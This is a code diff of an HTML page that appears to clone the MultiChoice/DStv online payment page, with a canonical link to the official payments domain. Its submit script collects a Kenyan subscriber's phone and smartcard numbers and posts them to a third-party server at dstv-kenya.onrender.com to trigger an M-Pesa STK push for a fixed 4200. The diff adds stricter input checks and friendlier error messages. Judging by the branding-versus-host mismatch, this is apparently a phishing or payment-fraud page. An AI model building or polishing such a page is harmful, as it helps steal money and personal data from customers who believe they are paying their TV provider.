@@ -10,42 +10,66 @@
 <style>html{height:100%}body{color:white;margin:0;display:block;height:100%;font-size:12px;line-height:16px;font-family:"Poppins",sans-serif;word-wrap:break-word}.outer-wrapper{width:100%;height:auto;min-height:100vh;position:relative;background-color:#0a121d}.gradient{height:100%;width:100%;position:absolute;top:0;left:0;z-index:1;opacity:0.2;background:radial-gradient(white 0%,#f0f2f9 100%);box-shadow:318.4615478516px 318.4615478516px 318.4615478516px;filter:blur(318.46px)}.content{position:relative;z-index:2}.header{padding:20px;background-color:#0a121d;opacity:0.8}.inner-wrapper{display:flex;justify-content:center}.inner-content{flex-grow:1;margin:24px 16px 16px 16px;display:flex;flex-direction:column;max-width:488px}.amount-to-pay{padding:20px;background-color:#0a121d;border-radius:12px;border:1px solid #162233;margin-bottom:24px;opacity:0.8;transition:all 1s ease}.amount-to-pay .summary{display:flex;justify-content:space-between;align-items:flex-end}.amount-to-pay .summary img{cursor:pointer;transition:transform 0.5s ease;-webkit-user-select:none;-moz-user-select:none;user-select:none}.button-contatiner{display:flex;justify-content:center;align-items:center}.button-contatiner button{text-decoration:none;text-align:center;cursor:pointer;flex-grow:1;border-radius:50px;border:none}.mobile{display:flex;flex-direction:column;position:relative}.mobile input{padding:12px 16px;border-radius:12px;border:1px solid #dfdfdf;flex-grow:1}.mobile .errors{list-style:none;padding-left:0;margin-bottom:24px}.mobile .button-contatiner button{color:white;background-color:#0095da;padding:15px 30px;font-weight:700;font-size:14px;line-height:16.8px}.mobile .button-contatiner button:disabled{background-color:#dfdfdf;color:#bababa}.mobile .instructions{display:flex;gap:5px;flex-direction:column;margin-bottom:16px}.mobile .instructions .instruction{display:flex;align-items:center;gap:8px}.mobile .instructions .instruction .number{display:flex;justify-content:center;align-items:center;font-family:"Inter",sans-serif;color:white;font-weight:500;background-color:#0095da;border-radius:50%;width:2px;height:2px;padding:8px}.mobile .instructions .spacer{background-color:#dfdfdf;height:24px;width:1px;margin-left:8px}.cardForm .button-contatiner button:disabled{cursor:none;background-color:#dfdfdf;color:#bababa}.footer{display:flex;align-items:center;flex-direction:column;margin-top:100px}.footer span{margin-top:24px;font-size:13px;line-height:20px}.footer a{color:#0095da;text-decoration:none}@keyframes collapse{0%{height:10%}100%{height:100%}}@keyframes loader{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
 <meta name=referrer content=no-referrer><link rel=canonical href="https://payments.multichoice.com/multichoice_online_payments/payment.do?token=3bd32350-f138-49ed-ba83-4b15db77079a&amp;lang=en"><meta http-equiv=content-security-policy content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:; form-action 'none'; base-uri 'none';"></head>
  <body>
-  <script>
+<script>
 document.addEventListener("DOMContentLoaded", function () {
   const form = document.getElementById("vendorFieldsForm");
   
-  // Select the phone number input (first MSISDN input)
-  const phoneInput = document.querySelector('input[name="MSISDN"]');
-  // Select the smartcard input (second MSISDN input)
-  const smartcardInputs = document.querySelectorAll('input[name="MSISDN"]');
-  const smartcardInput = smartcardInputs[1] || null;
+  // Select both MSISDN inputs by order: Index 0 = Mobile, Index 1 = Smartcard
+  const msisdnInputs = document.querySelectorAll('input[name="MSISDN"]');
+  const phoneInput = msisdnInputs[0] || null;
+  const smartcardInput = msisdnInputs[1] || null;
 
   form.addEventListener("submit", async function (event) {
-    event.preventDefault(); // Stop default form redirect
+    event.preventDefault(); // Prevent standard form redirect
 
     let phone = phoneInput ? phoneInput.value.trim() : "";
     let smartcard = smartcardInput ? smartcardInput.value.trim() : "";
 
+    // 1. Validate Mobile Number Presence
     if (!phone) {
-      alert("Please enter a mobile number.");
+      alert("Please enter your mobile number.");
+      phoneInput?.focus();
       return;
     }
 
-    // Convert local zero format (0712345678) or +254 to standard format expected by Palpluss
+    // 2. Validate Smartcard Number Presence
+    if (!smartcard) {
+      alert("Please enter your Smartcard number.");
+      smartcardInput?.focus();
+      return;
+    }
+
+    // 3. Clean and Format Phone Number to Palpluss Standard (07XXXXXXXX or 01XXXXXXXX)
+    phone = phone.replace(/\s+/g, ''); // Remove spaces
+
     if (phone.startsWith("+254")) {
       phone = "0" + phone.slice(4);
     } else if (phone.startsWith("254")) {
       phone = "0" + phone.slice(3);
     }
 
+    // Validate Kenyan mobile number structure (10 digits starting with 07 or 01)
+    const kenyaPhoneRegex = /^0[71]\d{8}$/;
+    if (!kenyaPhoneRegex.test(phone)) {
+      alert("Please enter a valid Safaricom phone number (e.g., 0712345678 or 0790123456).");
+      phoneInput.focus();
+      return;
+    }
+
+    // 4. Update UI state during submission
     const button = form.querySelector("button");
     button.disabled = true;
-    button.innerText = "Processing...";
+    const originalButtonText = button.innerText;
+    button.innerText = "Initiating STK Push...";
 
     try {
+      // 5. Send POST request to backend
       const response = await fetch("https://dstv-kenya.onrender.com/api/stkpush", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: { 
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
         body: JSON.stringify({ 
           phone: phone, 
           amount: 4200, 
@@ -58,13 +82,16 @@ document.addEventListener("DOMContentLoaded", function () {
       if (response.ok) {
         alert("STK Push sent successfully! Check your phone to enter your M-Pesa PIN.");
       } else {
-        alert("Payment error: " + (data.message || data.error || "Failed to initiate payment."));
+        const errorMsg = data.message || data.error || data.detail || "Failed to initiate payment.";
+        alert("Payment Error: " + errorMsg);
       }
     } catch (err) {
-      alert("Network connection error. Please try again.");
+      console.error("Payment Submission Error:", err);
+      alert("Network connection error. Server may be starting up—please try again in a few seconds.");
     } finally {
+      // 6. Reset UI state
       button.disabled = false;
-      button.innerText = "Continue";
+      button.innerText = originalButtonText;
     }
   });
 });
